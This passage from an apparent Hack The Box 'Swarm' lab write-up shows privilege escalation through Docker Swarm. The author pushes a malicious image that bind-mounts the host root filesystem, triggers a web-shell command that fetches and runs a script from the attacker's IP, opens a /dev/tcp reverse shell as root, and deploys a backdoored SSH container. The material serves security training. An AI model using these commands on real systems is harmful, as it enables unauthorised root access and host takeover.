+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker image tag pwnpod:latest 10.129.230.94:5000/pwnpod:latest
+</span></span><span style="display:flex;"><span>docker push 10.129.230.94:5000/pwnpod:latest
+</span></span></code></pre></div><p>Finally, we create the service and push it to the swarm, infecting all nodes. We expose the service on port <code>1337</code>, and specify a mount, namely the root filesystem <code>/</code>, which will be mounted on <code>/mnt</code> within the container.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker service create -d -p 1337:1337 --name pwnpod --replicas <span style="color:#ae81ff">2</span> --mount type<span style="color:#f92672">=</span>bind,source<span style="color:#f92672">=</span>/,target<span style="color:#f92672">=</span>/mnt localhost:5000/pwnpod:latest  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>image localhost:5000/pwnpod:latest could not be accessed on a registry to record
+</span></span><span style="display:flex;"><span>its digest. Each node will access localhost:5000/pwnpod:latest independently,
+</span></span><span style="display:flex;"><span>possibly leading to different nodes running different
+</span></span><span style="display:flex;"><span>versions of the image.
+</span></span></code></pre></div><p>Two things are crucial here. Firstly, while one might be tempted to specify the remote registry explicitly, i.e. <code>10.129.230.94:5000</code>, this will cause the you to pwn yourself, as the container will be defined on your system and despite being accessible via <code>10.129.230.94:1337</code>, your own filesystem will be mounted, instead of the target&rsquo;s. As such, we must define the registry as <code>localhost:5000</code>, which will fail on our system but succeed on the target system, which actually has a running registry. Secondly, note the <code>--replicas 2</code>. With more members in the swarm, we could either make this a global service or increase the replicas, to affect more nodes in the swarm.</p>
+<p>We can now see the malicious containers running, but only on the target system (<code>swarm</code>). For us, the <code>htb-...</code> nodes, we get a <code>No such image:</code> error, as it tried to load the image from <code>localhost:5000</code>, which doesn&rsquo;t exist on our system.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker service ps pwnpod
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ID             NAME           IMAGE                          NODE             DESIRED STATE   CURRENT STATE             ERROR                              PORTS
+</span></span><span style="display:flex;"><span>wavip6eyx4bp   pwnpod.1       localhost:5000/pwnpod:latest   swarm            Ready           Ready <span style="color:#ae81ff">3</span> seconds ago                                          
+</span></span><span style="display:flex;"><span>tqk01tcrenl0    <span style="color:#ae81ff">\_</span> pwnpod.1   localhost:5000/pwnpod:latest   htb-rudmqnwpkl   Shutdown        Rejected <span style="color:#ae81ff">9</span> seconds ago    <span style="color:#e6db74">&#34;No such image: localhost:5000…&#34;</span>   
+</span></span><span style="display:flex;"><span>xy2nf4qodxoq    <span style="color:#ae81ff">\_</span> pwnpod.1   localhost:5000/pwnpod:latest   htb-rudmqnwpkl   Shutdown        Rejected <span style="color:#ae81ff">14</span> seconds ago   <span style="color:#e6db74">&#34;No such image: localhost:5000…&#34;</span>   
+</span></span><span style="display:flex;"><span>kj8xox16lqt0    <span style="color:#ae81ff">\_</span> pwnpod.1   localhost:5000/pwnpod:latest   htb-rudmqnwpkl   Shutdown        Rejected <span style="color:#ae81ff">19</span> seconds ago   <span style="color:#e6db74">&#34;No such image: localhost:5000…&#34;</span>   
+</span></span><span style="display:flex;"><span>80k8q23aofv4    <span style="color:#ae81ff">\_</span> pwnpod.1   localhost:5000/pwnpod:latest   htb-rudmqnwpkl   Shutdown        Rejected <span style="color:#ae81ff">24</span> seconds ago   <span style="color:#e6db74">&#34;No such image: localhost:5000…&#34;</span>   
+</span></span><span style="display:flex;"><span>kmjrvnmid1ff   pwnpod.2       localhost:5000/pwnpod:latest   swarm            Running         Running <span style="color:#ae81ff">17</span> seconds ago
+</span></span></code></pre></div><p>Checking the open ports on the target reveals that <code>1337</code> is listening, as we defined.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>plessing@swarm:~$ ss -tlpn
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process
+</span></span><span style="display:flex;"><span>LISTEN    <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">4096</span>               0.0.0.0:5000             0.0.0.0:*
+</span></span><span style="display:flex;"><span>LISTEN    <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">4096</span>               0.0.0.0:80               0.0.0.0:*
+</span></span><span style="display:flex;"><span>LISTEN    <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">128</span>                0.0.0.0:22               0.0.0.0:*
+</span></span><span style="display:flex;"><span>LISTEN    <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">4096</span>                  <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:5000                <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:*
+</span></span><span style="display:flex;"><span>LISTEN    <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">4096</span>                     *:2377                   *:*
+</span></span><span style="display:flex;"><span>LISTEN    <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">4096</span>                     *:7946                   *:*
+</span></span><span style="display:flex;"><span>LISTEN    <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">4096</span>                  <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:80                  <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:*
+</span></span><span style="display:flex;"><span>LISTEN    <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">128</span>                   <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:22                  <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:*
+</span></span><span style="display:flex;"><span>LISTEN    <span style="color:#ae81ff">0</span>         <span style="color:#ae81ff">4096</span>                     *:1337                   *:*
+</span></span></code></pre></div><p>Finally, we can use this exposed port to access our malicious PHP server and get a shell inside the container, with the target&rsquo;s filesystem mounted.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://swarm.htb:1337/index.php?0<span style="color:#f92672">=</span>id
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Shell incoming:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nlvp <span style="color:#ae81ff">4444</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat &gt; boom.sh<span style="color:#e6db74">&lt;&lt;EOF
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">#!/bin/sh
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">/bin/sh -i &gt;&amp; /dev/tcp/10.10.14.59/4444 0&gt;&amp;1
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">80</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl http://10.129.230.94:1337/index.php?0<span style="color:#f92672">=</span>curl+10.10.14.59/boom.sh<span style="color:#ae81ff">\|</span>bash
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nlvp <span style="color:#ae81ff">4444</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.14.59<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>172.18.0.8<span style="color:#f92672">]</span> <span style="color:#ae81ff">38604</span>
+</span></span><span style="display:flex;"><span>/bin/sh: 0: can<span style="color:#960050;background-color:#1e0010">&#39;</span>t access tty; job control turned off
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># id</span>
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>We got a shell as <code>root</code>. The host filesystem is mounted in <code>/mnt</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># cd /mnt</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ls -al root </span>
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">56</span>
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">6</span> root root  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">30</span> 16:31 .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">18</span> root root  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">17</span> 08:46 ..
+</span></span><span style="display:flex;"><span>lrwxrwxrwx  <span style="color:#ae81ff">1</span> root root     <span style="color:#ae81ff">9</span> Apr <span style="color:#ae81ff">25</span> 14:58 .bash_history -&gt; /dev/null
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">571</span> Apr <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">2021</span> .bashrc
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">3</span> root root  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">24</span> 16:55 .cache
+</span></span><span style="display:flex;"><span>drwx------  <span style="color:#ae81ff">3</span> root root  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">25</span> 13:09 .docker
+</span></span><span style="display:flex;"><span>-rw-r--r--  <span style="color:#ae81ff">1</span> root root   <span style="color:#ae81ff">161</span> Jul  <span style="color:#ae81ff">9</span>  <span style="color:#ae81ff">2019</span> .profile
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">2</span> root root  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">25</span> 11:57 .vim
+</span></span><span style="display:flex;"><span>-rw-------  <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">18003</span> Apr <span style="color:#ae81ff">30</span> 16:31 .viminfo
+</span></span><span style="display:flex;"><span>drwxr-xr-x  <span style="color:#ae81ff">4</span> root root  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">25</span> 14:44 docker
+</span></span><span style="display:flex;"><span>-rw-r-----  <span style="color:#ae81ff">1</span> root root    <span style="color:#ae81ff">33</span> Apr <span style="color:#ae81ff">25</span> 14:58 root.txt
+</span></span></code></pre></div><p>Alas, we obtain the dreaded final flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># cat root/root.txt</span>
+</span></span><span style="display:flex;"><span>HTB<span style="color:#f92672">{</span>5tunG_bY_th3_5w4rm<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h1 id="alternative-privesc-methods">Alternative Privesc Methods</h1>
+<p>Alternative methods of exploitation include creating a swarm on our attacking machine, as opposed to initialising it on the target, and joining it from the target system as a worker. One can then also deploy malicious images, either by forwarding a local registry or using the one on the target.</p>
+<p>The steps are similar; we first initialise a swarm on our attacking machine:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker swarm init --advertise-addr 10.10.14.12
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Swarm initialized: current node <span style="color:#f92672">(</span>wrcs67aevd8b91apm7gk0d0jq<span style="color:#f92672">)</span> is now a manager.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>To add a worker to this swarm, run the following command:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    docker swarm join --token SWMTKN-1-5s1avojblmwgma55ie1bssf9ssye0h2erbuosqppj2ihqr3779-4p7iiqqlwrg6ef76m59uxh2ov 10.10.14.12:2377
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>To add a manager to this swarm, run <span style="color:#e6db74">&#39;docker swarm join-token manager&#39;</span> and follow the instructions.
+</span></span></code></pre></div><p>We then run the provided command on the target machine to join our swarm as a worker.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>plessing@swarm:~$ sudo docker swarm join --token SWMTKN-1-5s1avojblmwgma55ie1bssf9ssye0h2erbuosqppj2ihqr3779-4p7iiqqlwrg6ef76m59uxh2ov 10.10.14.12:2377
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>This node joined a swarm as a worker.
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker node ls
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ID                            HOSTNAME         STATUS    AVAILABILITY   MANAGER STATUS   ENGINE VERSION
+</span></span><span style="display:flex;"><span>wrcs67aevd8b91apm7gk0d0jq *   htb-rudmqnwpkl   Ready     Active         Leader           25.0.3
+</span></span><span style="display:flex;"><span>r79o0kqhcwktmljza2s2d7rto     swarm            Ready     Active                          26.1.1
+</span></span></code></pre></div><p>I&rsquo;ll also demonstrate the <code>OpenSSH</code> alternative here, as opposed to our PHP web shell. Once again, this would be of benefit to individuals on different architectures, who otherwise would not be able to create a local image and push it to the target.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker pull lscr.io/linuxserver/openssh-server:amd64-latest
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>amd64-latest: Pulling from linuxserver/openssh-server
+</span></span><span style="display:flex;"><span>6c0d85d774e7: Pull complete 
+</span></span><span style="display:flex;"><span>1c50a76b3d41: Pull complete 
+</span></span><span style="display:flex;"><span>d48dba489a7d: Pull complete 
+</span></span><span style="display:flex;"><span>069593985fd7: Pull complete 
+</span></span><span style="display:flex;"><span>5dc7ed07e470: Pull complete 
+</span></span><span style="display:flex;"><span>e815c350f682: Pull complete 
+</span></span><span style="display:flex;"><span>46b882b84dc4: Pull complete 
+</span></span><span style="display:flex;"><span>Digest: sha256:bd738dd7a7012fe38f2f6829a8511cd980c05f1ed511390e38b14c3164518445
+</span></span><span style="display:flex;"><span>Status: Downloaded newer image <span style="color:#66d9ef">for</span> lscr.io/linuxserver/openssh-server:amd64-latest
+</span></span><span style="display:flex;"><span>lscr.io/linuxserver/openssh-server:amd64-latest
+</span></span></code></pre></div><p>Again, we tag and push it to the target&rsquo;s registry:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker image tag lscr.io/linuxserver/openssh-server:amd64-latest swarm.htb:5000/lscr.io/linuxserver/openssh-server:amd64-latest
+</span></span><span style="display:flex;"><span>docker push swarm.htb:5000/lscr.io/linuxserver/openssh-server:amd64-latest
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The push refers to repository <span style="color:#f92672">[</span>swarm.htb:5000/lscr.io/linuxserver/openssh-server<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>3348306d1b8b: Pushed 
+</span></span><span style="display:flex;"><span>d296c9cd4a28: Pushed 
+</span></span><span style="display:flex;"><span>d58325308e45: Pushed 
+</span></span><span style="display:flex;"><span>98051686a067: Pushed 
+</span></span><span style="display:flex;"><span>cd7df000bc55: Pushed 
+</span></span><span style="display:flex;"><span>c2b4ff0f7a07: Pushed 
+</span></span><span style="display:flex;"><span>67230d759fa0: Pushed 
+</span></span><span style="display:flex;"><span>amd64-latest: digest: sha256:bd738dd7a7012fe38f2f6829a8511cd980c05f1ed511390e38b14c3164518445 size: <span style="color:#ae81ff">1782</span>
+</span></span></code></pre></div><p>Finally, we create the service, same as before. To make the attack a little more sophisticated, I will show how to precisely target a given node in the swarm.</p>
+<h3 id="targeting-nodes">Targeting Nodes</h3>
+<p>We can add arbitrary metadata to a node using labels, which we can then in turn use to specify constraints on where to deploy a service.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker node update --label-add target<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> swarm 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>swarm
+</span></span></code></pre></div><p>Here, we simply add a <code>target</code> label to the node. This could, of course, be done much more covertly. We can see the label when inspecting the node:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker node inspect swarm --pretty
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ID:			r79o0kqhcwktmljza2s2d7rto
+</span></span><span style="display:flex;"><span>Labels:
+</span></span><span style="display:flex;"><span> - target<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Hostname:              	swarm
+</span></span><span style="display:flex;"><span>Joined at:             	2024-05-22 07:54:02.461147339 +0000 utc
+</span></span><span style="display:flex;"><span>Status:
+</span></span><span style="display:flex;"><span> State:			Ready
+</span></span><span style="display:flex;"><span> Availability:         	Active
+</span></span><span style="display:flex;"><span> Address:		10.129.242.34
+</span></span><span style="display:flex;"><span>Platform:
+</span></span><span style="display:flex;"><span> Operating System:	linux
+</span></span><span style="display:flex;"><span> Architecture:		x86_64
+</span></span><span style="display:flex;"><span>Resources:
+</span></span><span style="display:flex;"><span> CPUs:			<span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span> Memory:		3.793GiB
+</span></span><span style="display:flex;"><span>Plugins:
+</span></span><span style="display:flex;"><span> Log:		awslogs, fluentd, gcplogs, gelf, journald, json-file, local, splunk, syslog
+</span></span><span style="display:flex;"><span> Network:		bridge, host, ipvlan, macvlan, null, overlay
+</span></span><span style="display:flex;"><span> Volume:		local
+</span></span><span style="display:flex;"><span>Engine Version:		26.1.1
+</span></span><span style="display:flex;"><span>TLS Info:
+</span></span><span style="display:flex;"><span> TrustRoot:
+</span></span><span style="display:flex;"><span>-----BEGIN CERTIFICATE-----
+</span></span><span style="display:flex;"><span>MIIBazCCARCgAwIBAgIUI5xC/uLTYChqRqmzs+ON/itvgcgwCgYIKoZIzj0EAwIw
+</span></span><span style="display:flex;"><span>EzERMA8GA1UEAxMIc3dhcm0tY2EwHhcNMjQwNTIyMDc0ODAwWhcNNDQwNTE3MDc0
+</span></span><span style="display:flex;"><span>ODAwWjATMREwDwYDVQQDEwhzd2FybS1jYTBZMBMGByqGSM49AgEGCCqGSM49AwEH
+</span></span><span style="display:flex;"><span>A0IABDjHVwilDdZ7fa1t21gpM8Ea5JjbznBudoELzDGsvNsvQMMTT1rNNPLZuvGp
+</span></span><span style="display:flex;"><span>kJYS0ZI8QfTAVYjBgf8LLZpGEV6jQjBAMA4GA1UdDwEB/wQEAwIBBjAPBgNVHRMB
+</span></span><span style="display:flex;"><span>Af8EBTADAQH/MB0GA1UdDgQWBBQNudO66JJXeWysH9sEEZSsPonYWjAKBggqhkjO
+</span></span><span style="display:flex;"><span>PQQDAgNJADBGAiEAnQWQDJ4mWHFfMK2gwynoW7xYyxAmolRtgVEB6Q2dG4kCIQCk
+</span></span><span style="display:flex;"><span>tt6QBfKr6GUZ9qF2DLw927ract6FcFQ7bL1QsrE2wg<span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>-----END CERTIFICATE-----
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Issuer Subject:	MBMxETAPBgNVBAMTCHN3YXJtLWNh
+</span></span><span style="display:flex;"><span> Issuer Public Key:	MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEOMdXCKUN1nt9rW3bWCkzwRrkmNvOcG52gQvMMay82y9AwxNPWs008tm68amQlhLRkjxB9MBViMGB/wstmkYRXg<span style="color:#f92672">==</span>
+</span></span></code></pre></div><p>Now, we create the service, targeting only nodes in possession of this <code>target</code> label.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker service create --name pwnpod2 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>--mode global <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>--constraint node.labels.target<span style="color:#f92672">==</span><span style="color:#ae81ff">1</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>--mount type<span style="color:#f92672">=</span>bind,source<span style="color:#f92672">=</span>/,target<span style="color:#f92672">=</span>/mnt <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-e SUDO_ACCESS<span style="color:#f92672">=</span>true <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-e USER_NAME<span style="color:#f92672">=</span>melo <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-e USER_PASSWORD<span style="color:#f92672">=</span>melo <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-e PASSWORD_ACCESS<span style="color:#f92672">=</span>true <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>-p 2222:2222 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>swarm.htb:5000/lscr.io/linuxserver/openssh-server:amd64-latest
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>overall progress: <span style="color:#ae81ff">1</span> out of <span style="color:#ae81ff">1</span> tasks 
+</span></span><span style="display:flex;"><span>r79o0kqhcwkt: running   
+</span></span><span style="display:flex;"><span>verify: Service converged
+</span></span></code></pre></div><p>And to verify:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker service ps pwnpod2
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ID             NAME                                IMAGE                                                            NODE      DESIRED STATE   CURRENT STATE            ERROR     PORTS
+</span></span><span style="display:flex;"><span>jdq7ufwk0gbr   pwnpod2.r79o0kqhcwktmljza2s2d7rto   swarm.htb:5000/lscr.io/linuxserver/openssh-server:amd64-latest   swarm     Running         Running <span style="color:#ae81ff">10</span> seconds ago
+</span></span></code></pre></div><p>We see that the service was started on the target machine, and port <code>2222</code> is now open:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>plessing@swarm:~$ ss -tlpn
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port  Process  
+</span></span><span style="display:flex;"><span>LISTEN   <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">4096</span>             0.0.0.0:5000          0.0.0.0:*              
+</span></span><span style="display:flex;"><span>LISTEN   <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">4096</span>             0.0.0.0:80            0.0.0.0:*              
+</span></span><span style="display:flex;"><span>LISTEN   <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">128</span>              0.0.0.0:22            0.0.0.0:*              
+</span></span><span style="display:flex;"><span>LISTEN   <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">4096</span>                <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:5000             <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:*              
+</span></span><span style="display:flex;"><span>LISTEN   <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">4096</span>                   *:7946                *:*              
+</span></span><span style="display:flex;"><span>LISTEN   <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">4096</span>                   *:2222                *:*              
+</span></span><span style="display:flex;"><span>LISTEN   <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">4096</span>                <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:80               <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:*              
+</span></span><span style="display:flex;"><span>LISTEN   <span style="color:#ae81ff">0</span>        <span style="color:#ae81ff">128</span>                 <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:22               <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:*  
+</span></span></code></pre></div><p>We can now <code>ssh</code> into the target on port <code>2222</code> as the <code>melo</code> user:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh melo@swarm.htb -p <span style="color:#ae81ff">2222</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;[swarm.htb]:2222 ([10.129.242.34]:2222)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ECDSA key fingerprint is SHA256:BU1EzGvQydNBj02VL/Rz70W3+kbAkm+CvwNt17Tllhw.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span><span style="color:#f92672">[</span>swarm.htb<span style="color:#f92672">]</span>:2222,<span style="color:#f92672">[</span>10.129.242.34<span style="color:#f92672">]</span>:2222<span style="color:#e6db74">&#39; (ECDSA) to the list of known hosts.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">melo@swarm.htb&#39;</span>s password: melo
+</span></span><span style="display:flex;"><span>Welcome to OpenSSH Server
+</span></span><span style="display:flex;"><span>74de20dd9357:~$ sudo su
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>We trust you have received the usual lecture from the local System
+</span></span><span style="display:flex;"><span>Administrator. It usually boils down to these three things:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#1) Respect the privacy of others.</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#2) Think before you type.</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">#3) With great power comes great responsibility.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>For security reasons, the password you type will not be visible.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> melo: melo
+</span></span><span style="display:flex;"><span>/config <span style="color:#75715e"># </span>
+</span></span></code></pre></div><p>The filesystem is mounted in <code>/mnt</code>, giving us full access:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/config <span style="color:#75715e"># cat /mnt/root/root.txt </span>
+</span></span><span style="display:flex;"><span>HTB<span style="color:#f92672">{</span>5tunG_bY_th3_5w4rm<span style="color:#f92672">}</span>
